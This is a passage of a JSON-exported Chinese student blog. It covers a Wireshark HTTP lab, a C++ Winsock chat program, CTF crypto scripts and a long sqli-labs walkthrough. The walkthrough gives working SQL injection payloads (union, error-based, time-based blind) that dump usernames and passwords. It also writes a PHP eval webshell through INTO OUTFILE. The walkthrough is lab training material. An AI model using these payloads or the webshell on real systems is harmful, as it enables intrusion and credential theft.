Reply)。如果设置了TS这个选项，发送方发送时，将当前时间填入TSval，接收方回应时，将发送方的TSval填入TSecr即可(注意发送或接收都有设置TSval和TSecr )。 “TCP segment of a reassembled PDU”，指TCP层收到上层大块报文后分解成段后发出去 PSH所表达的是发送方通知接收方传输层应该尽快的将这个报文段交给应用层 通过观察可以发现消息显示出明显的周期性，即服务器发送三条消息，最后一条带有psh标志，客户端回应一条ack消息，且len=0 最后，返回状态码206，表示部分请求成功，视频获取完毕 在文本框输入信息并回显&lt;html&gt; &lt;head&gt; &lt;title&gt;1811494&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script language=\"javascript\"&gt; function getLoginMsg()&#123; loginMsg=document.loginForm; alert(\"name:\"+loginMsg.userName.value+\"\\n\"); &#125; &lt;/script&gt; &lt;form name=\"loginForm\"&gt; name:&lt;input type=\"text\" name=\"userName\"/&gt;&lt;br/&gt;&lt;br/&gt; &lt;input type=\"button\" value=\"submit\" onclick=\"getLoginMsg()\"/&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 输入姓名，点击submit 页面回显，但是在wireshark中没有找到回显内容相关数据包，猜测是因为使用了alert的函数是由浏览器直接处理的，并不将数据提交至服务器 总结 在实验过程中，我们发现，当第一次请求页面并请求成功时，页面会返回状态码200表示请求成功，并同时返回页面的html内容；当再次请求且页面没有修改时会返回304表示页面未修改可以直接使用浏览器缓存的内容 传输流程整体为： 客户端发出请求，服务器在局域网内（因为使用的是本地的虚拟机）发送查找网卡请求并找到ip对应的物理地址 三次握手建立连接 进行页面请求，服务器返回html内容 请求并返回图片和视频等内容 四次挥手断开连接 参考： https://www.wireshark.org/docs/wsdg_html_chunked/ https://blog.csdn.net/chenpuo/article/details/108186444 https://blog.csdn.net/lixiangminghate/article/details/83024865 https://blog.csdn.net/chenlycly/article/details/52402945 https://blog.csdn.net/asdfsadfasdfsa/article/details/88090027","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"socket","slug":"socket","permalink":"https://gitee.com/michelle19l/michelle19l/tags/socket/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"计算机网络作业1 利用Socket编写一个聊天程序","slug":"大三上/计网/计网作业1","date":"2021-01-15T04:00:00.000Z","updated":"2021-01-15T06:46:31.264Z","comments":true,"path":"2021/01/15/大三上/计网/计网作业1/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A1/","excerpt":"","text":"实验1：利用Socket编写一个聊天程序0. 摘要本次实验利用C++语言，编写了基于$TCP$的流式$SOCKET$的简易聊天室。利用$Winsock2.h$头文件编写了一个$WIN32$平台下的程序。该程序可以完成指定人数聊天室的创建，程序主要分为服务器端和客户端，服务器端负责接收客户端消息，解析报文，并将其转发至对应的接收者。在客户端程序中利用多线程编程，可以使消息的收和发之间不相互影响，可以连续发送多条消息，也可以连续接收多条消息。 1. 聊天协议说明文字编码方式为了支持中文和英文，使用UNICODE编码 报文格式本次实验进行了报文格式的简要设计，其内容为发送方+接收方+消息内容，在传输过程中采用字符串char*格式，为了方便解析，我还定义了msg_form类，方便报文内容的提取： class msg_form&#123;public: char from_name;//发送方标号 char to_name;//接收方 char msg[BUF_SIZE];//消息内容 注：本次实验只是简要设计，没有加入帧校验码等其它内容，并且只用了一个字节代表不同的客户端。在实际操作过程中，不同的客户端应用不同IP地址和端口号区分。 为了方便msg_form和char*之间的转换，定义了两个函数 char* msg_to_string(msg_form a);//用字符串存储报文msg_form string_to_msg(char a[]);//将字符串恢复成类 通过类型转换，我们可以更加方便快捷的设置和提取报文中的信息 聊天过程 设置聊天室人数CLIENTNUM 先开启服务器端(server.cpp)，建立socket，绑定ip和端口号，进入监听模式进行等待 开启客户端程序，设置相关信息，对服务器发出connect请求 服务器accept客户端的连接请求，并建立专属的连接通道，返回给客户端编号信息，等到达到预设的聊天人数即可开始聊天 客户端每次输入的消息格式为收信方编号+消息内容，在发送之前，该字符串前会被添加上发送者的编号。所以实际sendBuf中的内容为发送和编号+收信方编号+消息内容 服务器接收到信息后进行解析得到目的地址（本次程序简化为编号而不是ip），并有针对性的进行转发 当用户想要退出聊天室时，输入任意编号+quit即可退出程序，当服务端检测到在线人数为0时，自动退出程序 2. 编程程序说明 本程序基于WinSock2.h进行编写，并且需要链接ws2_32.lib库到此项目中 #include &lt;WinSock2.h&gt;//windows socket 编程头文件#pragma comment(lib,\"ws2_32.lib\")//链接ws2_32.lib库文件到此项目中 加载socket库，并约定使用的socket版本，对其进行初始化 //加载socket库WSADATA wsaData;//MAKEWORD(2.2),成功返回0if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0)&#123; cout &lt;&lt; \"socket初始化失败\" &lt;&lt; endl; return 0;&#125; 创建socket //创建一个socket，并将该socket绑定到一个特定的传输层SOCKET sockSer = socket(AF_INET, SOCK_STREAM, 0);//地址类型（ipv4），服务类型（流式套接字） 对端口和ip地址进行初始化 ip地址可以是本机或者其它任意可以ping通的地址 //初始化地址SOCKADDR_IN addrSeraddrSer.sin_addr.s_addr = inet_addr(\"192.168.89.1\");//本机ip地址中的一个addrSer.sin_family = AF_INET;//使用ipv4addrSer.sin_port = htons(PORT);//指定端口号，这是PORT=6666（可以打开的任意端口即可） server端需要将socket和ip、端口等内容进行绑定，当bind函数返回值为-1时，说明绑定出错 为例方便赋值，addrSer声明时为SOCKADDR_IN类型，但是SOCKADDR内全部为char类型类型更*方便传输** ) if (bind(sockSer, (SOCKADDR*)&amp;addrSer, sizeof(SOCKADDR)) == -1) cout &lt;&lt; \"bind error\" &lt;&lt; endl;//强制类型转换，SOCKADDR_IN方便赋值 SOCKADDR方便传输 server端使用listen函数进入监听模式，client发起connect请求，server端以此进行accept，同时server端可以统计连接client数目，并为client分配标号 SOCKET sockConn[CLIENTNUM];//在宏定义中声明CLIENTNUM为2，可以修改宏为多个 //serverfor (int i = 0; i &lt; CLIENTNUM; i++) &#123; listen(sockSer, 5); //为每个客户端分配一个socket连接，将客户端的相关信息存储在addrCli中 sockConn[i] = accept(sockSer, (SOCKADDR*)&amp;addrCli, &amp;len); if (sockConn[i] != INVALID_SOCKET)//成功建立socket &#123; cond++;//人数加一 cout &lt;&lt; \"用户\" &lt;&lt; i &lt;&lt; \"进入聊天\" &lt;&lt; endl; char buf[12]=\"你的id是：\"; buf[10] = 48 + i;//简化，最多九个人 buf[11] = 0; send(sockConn[i], buf, 50, 0); &#125; &#125; //clientcout &lt;&lt; \"connecting\" &lt;&lt; endl;//发出连接请求,addrSer是服务器端的ip地址和端口号sockCli = connect(sockClient, (SOCKADDR*)&amp;addrSer, sizeof(SOCKADDR));if (sockCli != SOCKET_ERROR)&#123; cout &lt;&lt; \"connected\" &lt;&lt; endl; while (1) &#123; char recvBuf[BUF_SIZE] = &#123;&#125;; //接受服务器端分配的编号 recv(sockClient, recvBuf, 50, 0); if (recvBuf[0]) &#123; cout &lt;&lt; recvBuf &lt;&lt; endl; //将char型编号转为int格式存储 ID = recvBuf[10] - 48; break; Sleep(30);//防止循环快速执行，占用大量资源 &#125; &#125;&#125; 当连接人数达到预设数量时，可以开始聊天 server端负责接收client发来的消息，解析目的地址并进行转发，为了可以同时接收到不同客户端发来的消息，这里使用多线程编程使得for循环内的线程可以同时执行并使用while(1)不断循环执行收发线程，为了减小CPU的负担，设置每个转发线程结束后要等待200ms。 while (1) &#123; for (int i = 0; i &lt; CLIENTNUM; i++) &#123; //线程函数 hThread = CreateThread(NULL, NULL, handlerRequest, LPVOID(i), 0, &amp;dwThreadId); //等待 WaitForSingleObject(hThread, 200); //线程资源释放 CloseHandle(hThread); &#125; if (!cond)break;//退出程序，后续详细介绍&#125; 函数参数是在连接时服务器为客户端分配的编号， DWORD WINAPI handlerRequest(LPVOID lparam)&#123; //指定一个socket通道（即指定接收一个客户端发来的消息） SOCKET sockettemp = sockConn[(int)lparam]; //生成局部变量recvBuf，并初始化为全0 char recvBuf[BUF_SIZE] = &#123;&#125;; //接收client发来的消息 recv(sockettemp, recvBuf, 1000, 0); //如果第一个字符不是'\\0’即接收到了消息 if (recvBuf[0]) &#123; cout &lt;&lt; recvBuf &lt;&lt; endl; //将字符串转为消息格式 msg_form m = string_to_msg(recvBuf); //读取目的地址 int id = m.to_name-48; cout &lt;&lt; id &lt;&lt; endl; //进行对应的消息转发 send(sockConn[id], recvBuf, 50, 0); //退出程序，后面详述 if (!strcmp(m.msg, \"quit\"))&#123; cout &lt;&lt; \"用户\" &lt;&lt; (int)lparam &lt;&lt; \"退出聊天\" &lt;&lt; endl; cond--; if (!cond)return 0; &#125; &#125; return 0;&#125; 对于client端，由于消息的收发没有顺序，且用户从键盘输入信息会造成阻塞，所以需要将消息的收和发放在两个不同的线程里，同样，将线程函数放在while(1)循环中以不断执行。 //线程HANDLE hThread1, hThread2;DWORD dwThreadId1, dwThreadId2; while (1)//不断循环知道用户输入quit命令&#123; //发送消息线程 hThread1 = CreateThread(NULL, NULL, handlerRequest1, LPVOID(sockClient), 0, &amp;dwThreadId1); //接收消息线程 hThread2 = CreateThread(NULL, NULL, handlerRequest2, LPVOID(sockClient), 0, &amp;dwThreadId2); //延迟 WaitForSingleObject(hThread1, 200); WaitForSingleObject(hThread2, 200); //释放线程资源 CloseHandle(hThread2); CloseHandle(hThread1); //退出 if (cond) break;&#125; 发送消息线程，注意，用户输入消息时，第一位应为消息接收方编号，然后程序自动为其在缓冲区首部添加发送方编号 DWORD WINAPI handlerRequest1(LPVOID lparam)&#123; //初始化两个buffer全部为0 char sendBuf[BUF_SIZE] = &#123;&#125;; char buffer[BUF_SIZE] = &#123;&#125;; //接收传进线程函数的参数 SOCKET socketClient = (SOCKET)(LPVOID)lparam; //使用getline函数，防止因为空格等字符终止读入 cin.getline(buffer, 2048, '\\n'); //发送的消息第一位为发送方编号 sendBuf[0] = ID + 48; //用户从键盘输入消息时，第一位为消息接收方编号 strcat(sendBuf, buffer); //发送消息 send(socketClient, sendBuf, 2048, 0); //分析将要发送的字符串 msg_form m = string_to_msg(sendBuf); //如果message部分是quit则退出程序 if (!strcmp(m.msg, \"quit\") || !strcmp(buffer, \"quit\")) cond = 1; return 0;&#125; 接收消息线程 DWORD WINAPI handlerRequest2(LPVOID lparam)&#123; //初始化接收消息缓冲区为全0 char recvBuf[BUF_SIZE] = &#123;&#125;; //接收参数 SOCKET socketClient = (SOCKET)(LPVOID)lparam; //接收发来的消息 recv(socketClient, recvBuf, 2048, 0); //如果消息不为空 if (recvBuf[0]) &#123; //对消息进行解析和打印 msg_form m = string_to_msg(recvBuf); cout &lt;&lt; m.from_name &lt;&lt; \": \" &lt;&lt; m.msg &lt;&lt; endl; &#125; return 0;&#125; 程序的退出 对于client端，需要由用户手动输入quit指令，为了简化代码，这里依然要使用编号+quit格式，但是编号可以是任意的一位数字 //状态码int cond;//在全局变量区声明，初值为0 //消息发送函数DWORD WINAPI handlerRequest1(LPVOID lparam)&#123; ...... //如果消息为“quit，则修改状态码为1 if (!strcmp(m.msg, \"quit\") ) cond = 1; return 0;&#125; int main()&#123; ...... while (1) &#123; hThread1 = CreateThread(NULL, NULL, handlerRequest1, LPVOID(sockClient), 0, &amp;dwThreadId1); ...... //主线程检测到cond值为1，则退出程序 if (cond) break; &#125; //关闭socket连接 closesocket(sockClient); //终止Winsock 2 DLL (Ws2_32.dll) 的使用 WSACleanup(); return 0;&#125; 对于server端，如果需要服务器常开则不需要退出程序，也可以设置为当所有客户端均断开连接时退出 这里对后者的代码进行展示 int cond;//全局数据区，初始化为0 在accept函数执行成功时，执行cond++，当所有客户端都成功连接时，cond==CLIENTNUM //转发函数DWORD WINAPI handlerRequest(LPVOID lparam)&#123; ...... //解析到客户端发来的消息为0 if (!strcmp(m.msg, \"quit\")) &#123; cout &lt;&lt; \"用户\" &lt;&lt; (int)lparam &lt;&lt; \"退出聊天\" &lt;&lt; endl; //已连接数量-1 cond--; if (!cond)return 0; &#125; return 0;&#125; if (cond == CLIENTNUM) &#123; cout &lt;&lt; CLIENTNUM &lt;&lt; \" clients have connected\" &lt;&lt; endl; while (1) &#123; ......//转发 //当主线程检测到在线人数为0时，退出程序 if (!cond)break; &#125; &#125;closesocket(sockSer);WSACleanup();return 0; 3. 对话界面展示和对话的退出 启动一个server程序和两个client程序 0号客户向1号发送消息Hi,server解析到01Hi,目的地址是1,向1号进行转发，1号客户端收到由0发来的消息Hi。并且可以看到程序支持收发中英文消息 如果0号向0号（自己）发送消息，则server回将收到的消息转发回去，而1号不能收到消息 同样，1也可以向0发送消息 0号发出退出指定，程序结束，server检测到用户0退出 1号发出退出指令，退出程序，server检测到1号退出，这时所有连接都已经断开，sesrver自动退出","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"socket","slug":"socket","permalink":"https://gitee.com/michelle19l/michelle19l/tags/socket/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"攻防世界crypto题解+crypto脚本整理","slug":"攻防世界crypto题解","date":"2020-09-21T13:20:53.000Z","updated":"2020-09-22T00:55:01.156Z","comments":true,"path":"2020/09/21/攻防世界crypto题解/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/09/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%E9%A2%98%E8%A7%A3/","excerpt":"","text":"base64https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5109&amp;page=1 base64加密脚本 import base64# str为待加密字符串str='Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9'str=str.encode(\"utf-8\")str_encode=base64.b64encode(str)print(str_encode) base64解密脚本 import base64# str为待加密字符串str='Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9'str=str.encode(\"utf-8\")str_encode=base64.b64decode(str)print(str_encode) Caesarhttps://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5110 暴力破解 # 凯撒密码# 常规 暴力破解str=input('输入待破解字符串：')for i in range(1,27): for j in str: if j.isalpha(): if (ord(j)&gt;=97 and ord(j)+i&gt;97+25) or (ord(j)&lt;97 and ord(j)&gt;=65 and ord(j)+i&gt;65+25): # 小写字母 print(chr(ord(j)+i-26),end='') else: print(chr(ord(j)+i),end='') else: print(j,end='') print('\\n') Morsehttps://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5111&amp;page=1 str='11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110'str2=''for i in str: if i=='1': str2+='-' elif i=='0': str2+='.' else: str2+=iprint(str2) 然后找个在线翻译器 Railfencehttps://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5112&amp;page=1 w型栅栏密码 http://www.atoolbox.net/Tool.php?Id=777 题面：五只小鸡-&gt;五栏 不仅仅是Morse支持包含斜杠的morse解码：http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx 解码后发现有大量AB内容 培根密码 http://rumkin.com/tools/cipher/baconian.php 混合编码https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=0&amp;id=5118&amp;page=1","categories":[],"tags":[]},{"title":"sagemath使用教程","slug":"sagemath使用教程","date":"2020-09-21T12:39:59.000Z","updated":"2020-09-21T13:21:00.890Z","comments":true,"path":"2020/09/21/sagemath使用教程/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/09/21/sagemath%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","excerpt":"","text":"官网地址：https://www.sagemath.org","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://gitee.com/michelle19l/michelle19l/tags/CTF/"},{"name":"密码","slug":"密码","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%AF%86%E7%A0%81/"}]},{"title":"sqli/sqli-labs","slug":"sqli/sqli-labs","date":"2020-08-29T04:42:18.284Z","updated":"2020-08-29T04:42:18.284Z","comments":true,"path":"2020/08/29/sqli/sqli-labs/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/","excerpt":"","text":"教程参考: https://blog.csdn.net/he_and/article/details/79979616 [https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1%20GET%20-%20Error%20based%20-%20Single%20quotes%20-%20String(%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)](https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)) [TOC] Page-1 Basic ChallengesLess-1 GET - Error Based -Single quotes - String 基于错误的GET单引号字符型注入初步判断 要求输入id，在网址上加入?id=1 有反应 再加单引号，报错，存在注入 实施攻击单引号可以被解析，通过闭合id参数，插入自己构造的sql语句实施攻击 ?id=1' order by 1 ## 报错，将##改为编码%23 ?id=1' order by 1 %23 成功显示，尝试，4的时候报错 说明db只有三个字段 当查询结果为多个时只返回第一个，所以使用union查询且使原结果为空 ?id=-1' union select 1,2,3 %23 发现2，3被显示在了页面上 获取当前数据库版本，数据库路径，当前用户，当前数据库 ?id=-1' union select 1,concat_ws('_',user(),version(),database()),@@basedir %23 拿到信息 表名 ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 payload http://localhost/sqli-labs-master/Less-1/?id=1%27%20and%20extractvalue(1,concat(0x7e,(select%20group_concat(username,0x3a,password)%20from%20users)))--+ Less-2 Error Based - Intiger 基于错误的GET整型注入同Less-1，单引号报错 ?id=1' order by 1 报错，判断是数值型注入 去掉单引号，其余同Less-1 Less-3 - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)源码 输入 ?id=1' %23 回显失败 ?id=1') %23 成功回显 Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）?id=1' 成功回显无报错 将单引号改成双引号 ?id=1\" 报错,显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1 仔细观察，是双引号+括号where id=(”1”)\\ ?id=1\") %23 正常回显 Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)使用一种的方法发现可以注入，但是页面不能返回我们想要的全部信息 可以采用类似时间盲注的方法（因为页面还是能返回一点点东西） 数据库名长度(可以采用二分法) ?id=1' and if(length(database())=8,sleep(5),1)--+ 有明显延迟，长度为8 爆破库名 id=1' and if(left(database(),1)='s',sleep(5),1)--+ left是提取最左边 Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)?id=1\" 返回错误信息 说明是双引号的注入 其余同五 Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）源码： 使用文件导出 使用前面的Less查到的路径 Less-2/?id=-1 union select 1,@@basedir,@@datadir --+ ?id=1')) union select 1,2,\"&lt;?php @eval($_POST['sql']);?&gt;\" into outfile '路径'%23 ?id=1')) union select 1,2,'&lt;?php @eval($_POST['sql']);?&gt;' into outfile \"D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\1.php\"--+ 注意必须要使用\\\\ ==我没有导出文件来== 导出来，导出来之后用菜刀或者蚁剑连接 Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)?id=' 不回显 id=1 回显 id=1' 不回显 id=1' and 1=1 %23 回显 id=1' and 1=2 %23 不回显 是布尔型注入 爆破方法 ?id=1' and left(database(),1)='s'%23 Less-9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)不管输入什么页面都显示一样-&gt;时间盲注 ?id=1' and sleep(3) %23 明显延迟 爆破方式参看less-5 Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)把9中的单引号改成双引号 Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入) username：&#39; or 1&#x3D;1 ##password: a 返回： Your Login name:DumbYour Password:Dumb 使用Dumb登录，成功 使用hackbar uname&#x3D;admin&#39; order by 2## &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 返回 Your Login name:adminYour Password:admin 使用union查询 注意，uname是错的，才能显示出union后的内容 uname&#x3D;a&#39; union select 1,database() ## &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 返回 Your Login name:1Your Password:security 数据库名security Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入) 输入‘，无反应，输入&quot; 返回 have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"\"\") and password看下源码![img](sqli-labs.assets&#x2F;20180822112455820.png)发现还有个括号，构造闭合语句 uname=1”) or 1=1## &amp;passwd=1 成功返回## Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)还是那个输入框，输入&#96;&#96;&#96;&#39;&#96;&#96;&#96;,&#96;&#96;&#96;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;) and password&#x3D;(&#39;&#39;) LIMIT 0,1&#39; at line 1 发现是通过(&#39;&#39;)闭合的 输入 1&#39;) or 1&#x3D;1 ## uname&#x3D;1&#39;) or 1&#x3D;1## &amp;passwd&#x3D;1 成功登录，但是没有回显信息 可以通过or语句判断输入信息是否正确（1=1处） Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)输入双引号 报错 have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"\"\" and password注释符不可用使双引号闭合 uname: “ or 1=1 or “passwd: 1 登录成功 uname=” or 1=2 or “ &amp;passwd=admin&amp;submit=Submit 登录失败，说明可以在1&#x3D;2处构造###### extractvalue(目标xml文档，xml路径)对XML文档进行查询的函数&#96;&#96;&#96;sqluname&#x3D;admin&quot; and extractvalue(1,concat(0x7e,(select database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 返回 syntax error: '~security'``````sqluname=admin\" and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and \" &amp;passwd=admin&amp;submit=Submit 返回 syntax error: '~5.5.53~'```## less-15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)没有回显 ‘ or 1=1 or ‘1’=’2 登录成功 ‘ or 1=(if(substr(version(),1,1)=5,1,0)) or ‘1’=’2 ## Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)上输入什么都没有反应 “) or 1=1 or “1”=(“2 admin”)## 均登录成功可以使用延迟注入## Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)页面提示：password reset![image-20200814133539931](sqli-labs.assets&#x2F;image-20200814133539931.png)&gt;一下转载自：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;ee6446e7f93c&gt;&gt;查看源码发现对&#96;user name&#96;表单进行了过滤：&gt;&gt;&gt;&gt;&#96;&#96;&#96;php&gt;&#x2F;&#x2F; take the variables&gt;if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))&gt;&#123;&gt;&#x2F;&#x2F;making sure uname is not injectable&gt;$uname&#x3D;check_input($_POST[&#39;uname&#39;]); &gt;$passwd&#x3D;$_POST[&#39;passwd&#39;];&gt; &gt;function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value; 函数check_input（）的作用就是检查用户输入，并将用户输入安全化，其中的mysql_real_escape_string()会在\\x00, \\n, \\r, \\, &#39;, &quot; and \\x1a这些字符前加入反斜线进行转义，防止注入，而且这个函数也避免了宽字节注入的危险。 3.当然，还不止，new password也不是和之前一样轻易试出注入类型，因为有user name的限制，如果new password不对，那么怎么试都自然是错的。因为看了大佬的解题思路，知道了为单引号闭合，SQL语句为：@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; $update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;且知道有用户名为admin(这个用户名一般都有)。所以就直接考虑构造了。 4.首先考虑到不能回显有意义的信息，所以首选前面一直用的双注入查询 构造如下：user name:填admin ,而new password:填&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x) as a)## 剩下的构造不多说，和Less-13一样，一个一个爆就好。5.在这里，尝试使用一种新的注入方法，基于extractvalue()和updatexml()的报错注入，详情请看: 学习基于extractvalue()和updatexml()的报错注入，同时，下面的注入丢默认user name:填admin6.先使用updatexml()进行注入，构造为&#39; and updatexml(1,concat(&#39;~&#39;,(select version())),1)## 获取相应版本: 获取数据库名称：&#39; and updatexml(1,concat(&#39;~&#39;,(select database())),1)## 获取表名：&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(table_name,&#39;;&#39;) from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),1)## 改变limit n,1即可获取其他表名。 获取列名：&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(column_name,&#39;;&#39;) from information_schema.columns where table_name=&#39;emails&#39; limit 0,1)),1)## 同样，改变limit n,1即可。 获取内容：这样，不行&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(username,&#39;;&#39;,password) from information_schema.tables where table_name=&#39;security&#39; limit 0,1)),1)## 报错如下： 这样：也不行&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(username,&#39;;&#39;,password) from security.users limit 0,1)),1)## 报错如下： 这样：发现可以了，但是password成了0，一下子把所有的用户密码都改成了0，后面的可能就有问题了。&#39; or (select 1 from (select count(*),concat((select concat(username,&#39;: &#39;,password,&#39;;&#39;) from security.users limit 0,1),floor(rand()*2)) as x from security.users group by x) as a)## 7.使用extractvalue()，和updatexml()十分相似，用法也差不多，甚至看起来跟直观些。构造：&#39; and extractvalue(1,concat(&#39;~&#39;,(select version())))## 剩下的语句和updatexml()的类似。 Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入) 源码： if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) &#123; $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); $sql=\"SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwdORDER BY users.id DESC LIMIT 0,1\";$result1 = mysql_query($sql);$row1 = mysql_fetch_array($result1); if($row1) &#123; echo '&lt;font color= \"##FFFF00\" font size = 3 &gt;'; $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; echo \"&lt;/font&gt;\"; //echo \"&lt;br&gt;\"; echo '&lt;font color= \"##0000ff\" font size = 3 &gt;'; echo 'Your User Agent is: ' .$uagent; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; print_r(mysql_error()); echo \"&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;br&gt;\"; &#125; else &#123; echo '&lt;font color= \"##0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; 在插入语句$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;前没有进行过滤 从uagent下手，用burpsuite抓包 4.易知，只要保证User-Agent:字段内容，即uagent保持单引号闭合，且使用双查询注入或使用extractvalue()或updatexml()构造相应语句即可（因为是在插入语句中，只能通过报错获取我们想要的信息）。 5.构造语句查询数据库名：构造一：&#39; and updatexml(1,concat(&#39;~&#39;,(select database())),1) and &#39;1&#39;=&#39;1 构造二：&#39; and extractvalue(1,concat(&#39;~&#39;,(select database()))) and &#39;1&#39;=&#39;1 构造三：&#39; and (select 1 from (select 